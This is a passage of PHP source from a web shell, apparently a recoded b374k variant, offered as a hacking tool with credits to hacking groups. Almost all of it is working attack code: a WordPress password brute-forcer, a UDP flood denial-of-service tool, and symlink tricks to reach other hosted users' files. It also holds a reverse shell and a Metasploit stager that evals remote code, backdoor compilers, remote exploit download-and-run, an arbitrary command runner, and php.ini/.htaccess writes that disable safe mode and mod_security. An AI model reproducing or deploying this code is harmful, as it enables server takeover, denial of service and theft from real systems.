					curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
					$login    =	   curl_exec($ch);

					if(eregi ("profile.php",$login) )
					{
						$hacked = 1;
						echo "<p>".$host." => UserName : [<font color='green'>".$username."</font>] : Password : [<font color='green'>".$password."</font>]</p>";
						ob_flush();flush();break;
					}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
		}
	}
	else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
}
?>
</td></tr>
</table></form></center>
<?php
function url_exists($strURL)
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}
echo "</p>";
}


//////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
<center><br><br><br>
Your IP: <font color="red"><b><?php echo $my_ip; ?></b></font>&nbsp;(Don't DoS yourself nub)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>

<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  Firee !!!   ">
<br><br>
<center>
After initiating the DoS attack, please wait while the browser loads.
</center>

</form>
</center>
<?php
$submit = $_POST['fire'];
if (isset($submit)) {

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">

<?php   

@set_time_limit(0);

echo "<br><br><center><h1>+--=[ Symlink ]=--+</h1></center><br><br><center><div class=content>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}

elseif(isset($_GET['x']) && ($_GET['x'] == 'domain'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=domain" method="post">

<?php

echo '<br><br><center><h1>+--=[ local domain viewer ]=--+</h1></center><br><br><div class=content>';

$file = @implode(@file("/etc/named.conf"));
if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
preg_match_all("#named/(.*?).db#",$file ,$r);
$domains = array_unique($r[1]);
//check();
//if(isset($_GET['ShowAll']))
{
echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <b>".count($domains)."</b> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td></tr>";
foreach($domains as $domain){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));

		echo "<tr><td>$domain</td><td>".$user['name']."</td></tr>";
		}
	echo "</table>";
	}

echo '</div>';
}
//////////////////////////////////////////////////////
/////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'tool'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=tool" method="post">
<?php

error_reporting(0);
function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'><table class='tabnet'><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
echo $s_result;
if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
}
////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'whois'))
   {
   ?>
   <form action="?y=<?php echo $pwd; ?>&x=whois" method="post">
   <?php
   @set_time_limit(0);
   @error_reporting(0);
   function sws_domain_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/whois/$site");
   flush();
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_net_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_site_ser($site)
   {
   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_sup_dom($site)
   {
   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
   return $ip;
   flush();
   }
   function sws_port_scan($ip)
   {
   $list_post = array('80','21','22','2082','25','53','110','443','143');
   foreach ($list_post as $o_port)
   {
   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
   if($connect)
   {
   echo " $ip : $o_port ??? <u style=\"color: #00ff00\">Open</u> <br /><br />";
   flush();
   }
   }
   }
   function findit($mytext,$starttag,$endtag) {
   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
   $posRight = @stripos($mytext,$endtag,$posLeft+1);
   return @substr($mytext,$posLeft,$posRight-$posLeft);
   flush();
   }
   echo '<br><br><center>';
   echo '
    <br />
    <div class="sc"><form method="post"><table class="tabnet">
	<tr><th colspan="5">Website Whois</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:#00ff00;background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:#00ff00;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> Not add IP .. !');}
   $ip_port = @gethostbyname($site);
   echo "
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";
   echo "".sws_port_scan($ip_port)." </pre></div> ";
   flush();
   echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class=\"ru\">
   <pre>".sws_domain_info($site)."</pre></div>";
   flush();
   echo "
   <div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_net_info($site)."</pre> </div>";
   flush();
   echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_sup_dom($site)."</pre> </div>";
   flush();
   echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_site_ser($site)."</pre> </div>
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
   flush();
   }
   echo '</center>';
   }
///////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=about" method="post">
	<center><br><br><img src='http://i.imgur.com/3m7leCw.jpg'>
    <br><br><br>terimakasih buat teman2 ku yang mau membantu saya menyelesaikan shell saya yang versi v3.1 spesial edition ini
	<br><br>[ s4mp4h | areg noid | Mr Gãndrunx (Hiddenymouz) | ardan | FH04ZA | antonio HSH | war0x | x shadow | bagonk ]<br>dan semua kawan-kawan ku
	<br><br><font size="5" color="#00ff00">Tanks to:</font></center><center>
<marquee direction="up" scrollamount="2" bgcolor="" width="250" height="40"><center>
<p><b><font size="3" color="#00ff00">=[ teman-temanku ]=<br><br>Gabby<br>Antonio HSH<br>R10<br>w4r0x<br>edelle007<br>Brian kamikaze<br>Clover Lepex<br>
Uyap<br>
Zinbad<br>FH04ZA<br>
Sani marpic<br>
Madan Cyber<br>
Cah Bagus<br>
RPG<br>Vallent<br>
P4njie_a.k.a<br>
Dwi Syntia<br>
Ærul Ringgo's<br>
Ti'ar Variabel<br>
Imei7<br>
Hmei7<br>
De Vinclous<br>
Blankon33<br>
Doza Cracker<br>
Ying Cracker<br>
Iranian Hacker<br>
Danger Hacker<br>
Admin07<br>
Zhou you<br>
Ksatria.us<br>
Cyber Inj3cti0n<br>
K2ll33d<br>
Sultan Haikal<br>
Syntax_Error<br>
Aqis<br>
Black Shadow<br>
crack999<br>
Fnatic Crew<br>
Coretan Rizal<br>
Malaikat Maut<br>
Dan teman-teman ku semua<br><br>
=[ grup hacking ]=<br><br>
Black Newbie Team<br>
3xpire Cyber Army<br>
Hack Forum<br>
Indonesia Fighter Cyber<br>
Biang Kerox Team<br>
Anonymous<br>Gaza Hacker<br>Albanian Hacker<br>Devilz c0de<br>Muslims Cyber Shellz<br>
X-Code<br>
Indonesian Security<br>
Indonesia Black Cyber<br>
B-Compi<br>
Jasakom<br>
Mojopahit Fighter Cyber<br>
Lappis<br>
Mojopahit Cyber Dark<br>
Crack Hack Forum<br>
dan semua grup hacking<br>
yang<br>
saya naungi dan singgahi<br><br><br>By<br>Cyber173 a.k.a X'1n73ct<br><br><br>
</font></b></p>
</center>
</marquee></center><br><br><br>
<?php
}
//////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'sqli-scanner'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=sqli-scanner" method="post">

<?php

echo '<br><br><center><form method="post" action=""><b><font color="green">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:#00ff00;background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#00ff00;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}
ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){ 
if(isset($_POST['uploadcomp'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;
		$stat = @move_uploaded_file($tmp_name,$pindah);		
		if ($stat) {
			$msg = "file uploaded to $pindah";
		}
		else $msg = "failed to upload $fname";
	}
	else $msg = "failed to upload $fname";
}
elseif(isset($_POST['uploadurl'])){
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$path = magicboom($_POST['path']);
	$namafile = download($pilihan,$wurl);
	$pindah = $path.$namafile;
	if(is_file($pindah)) {
		$msg = "file uploaded to $pindah";
	}
	else $msg = "failed to upload $namafile";

}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post">
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from computer</th></tr>
<tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
</tr>
</table></form>
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from url</th></tr>
<tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload">
<table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php }
elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){ 

// bind connect with c
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}

?>
<table class="tabnet">
<tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
<tr>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr>
<tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"></td></tr>
<tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr>
<tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td>
</tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form>
</table>
</td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){  ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" readonly>
<?php
if(isset($_POST['submitcmd'])) {
	echo @exe($_POST['cmd']);
}
?>
</textarea>
<tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr>
</table>
</form>
<?php } 
else { 
if(isset($_GET['delete']) && ($_GET['delete'] != "")){
	$file = $_GET['delete'];
	@unlink($file);
}
elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
	@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));
}
elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
	$path = $pwd.$_GET['mkdir'];
	@mkdir($path);
}
	$buff = showdir($pwd,$prompt);
	echo $buff;
}
?>
<br><input class=inputzbut align=left type=submit name=ini value="Bypass Disable Functions and Safemode" />
<?php
if(isset($_POST['ini']))
	{
		
$byphp = "safe_mode = Off
disable_functions = None
safe_mode_gid = OFF
open_basedir = OFF
allow_url_fopen = On";
$byht = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule>";
file_put_contents("php.ini",$byphp);
file_put_contents(".htaccess",$byht);
echo "<script>alert('Disable Functions and Safemode Created'); hideAll();</script>";
die();
		
		}

?><center><br><br><div class="info">-=[ b374k r3c0ded by <b>X'1N73CT</b> ]=-</div><br>
<div class="jaya">&copy; 2013 X'1N73CT</div></center><br><br>
</script>
</div>
</body>
</html>
<?php
function rooting()
{
echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; }
	else { echo '<b>Basarisiz</b><br><br>'; }
}
}
$x = $_GET["x"];
Switch($x){
case "rooting";
	rooting();
	break;
	
	}
?>
